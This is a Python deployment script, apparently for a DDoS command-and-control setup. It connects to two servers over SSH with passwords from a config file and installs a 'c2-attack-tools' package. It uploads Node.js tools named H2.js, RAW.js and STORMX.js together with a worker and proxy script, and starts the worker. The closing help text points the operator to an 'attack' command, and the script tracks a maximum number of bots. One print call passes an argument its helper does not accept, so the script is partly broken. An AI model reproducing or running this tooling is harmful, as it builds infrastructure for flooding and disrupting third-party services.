#!/usr/bin/env python3
import json
import paramiko
import os
import time
import sys

def print_color(text, color):
    """Print dengan warna"""
    colors = {
        'red': '\033[91m',
        'green': '\033[92m',
        'yellow': '\033[93m',
        'blue': '\033[94m',
        'purple': '\033[95m',
        'cyan': '\033[96m',
        'end': '\033[0m'
    }
    print(f"{colors.get(color, '')}{text}{colors['end']}")

def load_config():
    """Load konfigurasi dari file"""
    config_path = 'config.json'
    if not os.path.exists(config_path):
        print_color("[!] config.json tidak ditemukan!", 'red')
        sys.exit(1)
    
    with open(config_path, 'r') as f:
        return json.load(f)

def check_ssh_connection(ip, port, username, password):
    """Cek koneksi SSH"""
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(ip, port=port, username=username, password=password, timeout=5)
        ssh.close()
        return True
    except Exception as e:
        print_color(f"  SSH Failed: {e}", 'red')
        return False

def deploy_to_server(server_ip, port, username, password, server_name):
    """Deploy ke server tujuan"""
    print_color(f"\n[•] Deploying to {server_name} ({server_ip})...", 'cyan')
    
    # Cek koneksi dulu
    if not check_ssh_connection(server_ip, port, username, password):
        print_color(f"  [✗] Cannot connect to {server_name}", 'red')
        return False
    
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(server_ip, port=port, username=username, password=password, timeout=10)
        
        # Install dependencies
        print_color("  Installing dependencies...", 'yellow')
        commands = [
            "apt-get update -qq",
            "apt-get install -y python3-pip nodejs npm screen git -qq",
            "pip3 install flask requests paramiko psutil -q",
            "npm install -g axios http2 net --silent",
            "mkdir -p /root/c2/tools",
            "mkdir -p /root/c2/logs"
        ]
        
        for cmd in commands:
            print(f"    Running: {cmd[:50]}...")
            stdin, stdout, stderr = ssh.exec_command(cmd)
            stdout.channel.recv_exit_status()
        
        # Upload worker.py
        print_color("  Uploading worker.py...", 'yellow')
        sftp = ssh.open_sftp()
        
        if os.path.exists('tools/worker.py'):
            with open('tools/worker.py', 'r') as f:
                worker_content = f.read()
            with sftp.open('/root/c2/worker.py', 'w') as f:
                f.write(worker_content)
        
        # Upload Node.js tools
        print_color("  Uploading Node.js tools...", 'yellow')
        node_tools = ['H2.js', 'RAW.js', 'TO.js', 'STORMX.js', 'proxy.js']
        for tool in node_tools:
            tool_path = f'tools/{tool}'
            if os.path.exists(tool_path):
                print(f"    Uploading {tool}...")
                with open(tool_path, 'r') as f:
                    tool_content = f.read()
                with sftp.open(f'/root/c2/tools/{tool}', 'w') as tf:
                    tf.write(tool_content)
        
        sftp.close()
        
        # Buat config.json
        print_color("  Creating config.json...", 'yellow')
        with open('config.json', 'r') as f:
            main_config = json.load(f)
        
        server_config = {
            'worker_name': server_name,
            'worker_ip': server_ip,
            'worker_port': 5001,
            'master_ip': main_config['server1']['ip'],
            'master_port': 5000,
            'api_key': main_config['security']['api_key'],
            'max_bots': main_config[server_name]['max_bots']
        }
        
        config_json = json.dumps(server_config, indent=4)
        stdin, stdout, stderr = ssh.exec_command(f"cat > /root/c2/config.json << 'EOF'\n{config_json}\nEOF")
        
        # Buat package.json untuk Node.js
        print_color("  Creating package.json...", 'yellow')
        package_json = {
            "name": "c2-attack-tools",
            "version": "1.0.0",
            "description": "C2 Attack Tools",
            "main": "index.js",
            "dependencies": {
                "axios": "^1.6.0",
                "http2": "^3.3.7",
                "https": "^1.0.0",
                "net": "^1.0.2",
                "tls": "^1.0.1",
                "crypto": "^1.0.1"
            }
        }
        
        package_str = json.dumps(package_json, indent=2)
        stdin, stdout, stderr = ssh.exec_command(f"cat > /root/c2/package.json << 'EOF'\n{package_str}\nEOF")
        
        # Install Node.js dependencies
        print_color("  Installing Node.js dependencies...", 'yellow')
        ssh.exec_command("cd /root/c2 && npm install --silent")
        
        # Jalankan worker
        print_color("  Starting worker...", 'yellow')
        ssh.exec_command("cd /root/c2 && pkill -f worker.py; screen -dmS worker python3 worker.py")
        
        # Cek apakah worker berjalan
        time.sleep(2)
        stdin, stdout, stderr = ssh.exec_command("ps aux | grep worker.py | grep -v grep")
        worker_check = stdout.read().decode().strip()
        
        if worker_check:
            print_color(f"  [✓] Worker is running on {server_name}", 'green')
        else:
            print_color(f"  [⚠] Worker might not be running", 'yellow')
        
        ssh.close()
        print_color(f"  [✓] Deployment to {server_name} complete!", 'green')
        return True
        
    except Exception as e:
        print_color(f"  [✗] Error: {e}", 'red')
        return False

def test_connection(server):
    """Test koneksi ke server"""
    print_color(f"\n[•] Testing connection to {server['ip']}...", 'cyan')
    return check_ssh_connection(
        server['ip'],
        server['port'],
        server['username'],
        server['password']
    )

def main():
    """Main function"""
    print_color("""
    ╔════════════════════════════════════════════════════════════╗
    ║         Auto Deploy Tool - Python + Node.js C2             ║
    ║                    Version 2.0                              ║
    ╚════════════════════════════════════════════════════════════╝
    """, 'cyan')
    
    # Load config
    config = load_config()
    
    server1 = config['server1']
    server2 = config['server2']
    
    print_color(f"Server1: {server1['ip']}:{server1['port']} (Max Bots: {server1['max_bots']})", 'yellow')
    print_color(f"Server2: {server2['ip']}:{server2['port']} (Max Bots: {server2['max_bots']})", 'yellow')
    print_color(f"API Key: {config['security']['api_key']}", 'yellow')
    
    # Test koneksi ke kedua server
    print_color("\n[•] Testing connections...", 'cyan')
    server1_ok = test_connection(server1)
    server2_ok = test_connection(server2)
    
    if not server1_ok and not server2_ok:
        print_color("\n[✗] Cannot connect to any server! Check your config.json", 'red')
        sys.exit(1)
    
    # Konfirmasi
    print_color("\n[?] Ready to deploy? (y/n): ", 'purple', end='')
    confirm = input().lower()
    
    if confirm != 'y':
        print_color("[!] Deployment cancelled", 'yellow')
        sys.exit(0)
    
    # Deploy ke server1 jika bisa connect
    success1 = False
    if server1_ok:
        success1 = deploy_to_server(
            server1['ip'],
            server1['port'],
            server1['username'],
            server1['password'],
            'server1'
        )
        time.sleep(3)
    
    # Deploy ke server2 jika bisa connect
    success2 = False
    if server2_ok:
        success2 = deploy_to_server(
            server2['ip'],
            server2['port'],
            server2['username'],
            server2['password'],
            'server2'
        )
    
    # Summary
    print_color("\n" + "="*60, 'cyan')
    print_color("DEPLOYMENT SUMMARY:", 'purple')
    print_color(f"Server1 ({server1['ip']}): {'[✓] SUCCESS' if success1 else '[✗] FAILED'}", 'green' if success1 else 'red')
    print_color(f"Server2 ({server2['ip']}): {'[✓] SUCCESS' if success2 else '[✗] FAILED'}", 'green' if success2 else 'red')
    
    if success1 or success2:
        print_color("\n[✓] Deployment partial success!", 'green')
        print_color("\n[•] Next steps:", 'cyan')
        print_color("  1. Run: python3 index.py", 'yellow')
        print_color("  2. Use command 'status' to check servers", 'yellow')
        print_color("  3. Use command 'proxy' to update proxies", 'yellow')
        print_color("  4. Use command 'attack' to start attacks", 'yellow')
        
        if not success1:
            print_color("\n[⚠] Server1 failed to deploy. Check:", 'yellow')
            print_color("    - Password in config.json", 'yellow')
            print_color("    - SSH service is running", 'yellow')
            print_color("    - Port 22 is open", 'yellow')
        
        if not success2:
            print_color("\n[⚠] Server2 failed to deploy. Check:", 'yellow')
            print_color("    - Password in config.json", 'yellow')
            print_color("    - SSH service is running", 'yellow')
            print_color("    - Port 22 is open", 'yellow')
    else:
        print_color("\n[✗] Deployment failed completely!", 'red')
        print_color("Please check your server credentials and try again.", 'yellow')

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print_color("\n\n[!] Deployment interrupted by user", 'yellow')
        sys.exit(0)
    except Exception as e:
        print_color(f"\n[!] Unexpected error: {e}", 'red')
        sys.exit(1)